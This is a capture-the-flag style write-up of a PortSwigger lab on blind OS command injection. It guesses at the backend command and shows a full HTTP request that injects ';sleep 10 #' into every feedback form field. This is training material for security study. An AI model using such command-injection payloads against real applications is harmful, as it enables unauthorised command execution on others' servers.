# [Lab 2: Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)

---

## Description

This lab contains a blind [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

---

## Soution

On the home page of the target web application, navigate to `Submit feedback` to find the following form.

![](images/Pasted%20image%2020210819173948.png)

According to the challenge description, the functionality behind this form is vulnerable to blind OS command injection. Perhaps the backend shell command looks something like the following:

```bash
submit-feedback.py $NAME $EMAIL '$SUBJECT' '$MESSAGE'
```

However, the order of the arguments could be incorrect. Since the goal of the challenge is to cause the target to sleep for 10 seconds, inject a `sleep` command that ends in a comment `#` into each of the four parameters. Which ever argument actually comes first will comment out all the others.

```http
POST /feedback/submit HTTP/1.1
Host: ace51f871e6d34068051700f00f9007f.web-security-academy.net
Cookie: session=7dSCkiPiDuFM0WCDrrJHI0pD5kWdMx6D
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: https://ace51f871e6d34068051700f00f9007f.web-security-academy.net
Dnt: 1
Referer: https://ace51f871e6d34068051700f00f9007f.web-security-academy.net/feedback
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=xAozUP5m3YAZ7QUWjawznNBIuVR35mx3&name=;sleep+10+#&email=;sleep+10+#&subject=;sleep+10+#&message=;sleep+10+#
```

The request causes the target to sleep for 10 seconds, successfully completing the challenge!

